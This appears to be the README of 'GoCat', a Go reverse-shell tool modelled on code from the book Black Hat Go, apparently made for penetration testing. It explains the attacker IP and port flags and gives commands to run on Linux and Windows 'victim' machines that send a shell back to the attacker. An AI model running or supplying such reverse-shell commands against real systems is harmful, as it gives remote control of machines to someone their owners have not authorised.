# GoCat
A self-contained implementation of a reverse shell (netcat-like). It is an improvement based on the source code found on the book blackhat Go 

## Author
Alan Lacerda (alacerda) | intruderLabs team

## Usage
The command accepts 2 parameter:

-p string

        Port where the attacker is expecting the reverse shell back.

-s string

        Attacker's IP address to send the shell back.

### Linux Victim
./gocat -s <attacker-IP> -p <attacker-port>

### Windows victim
gocat.exe -s <attacker-IP> -p <attacker-port>
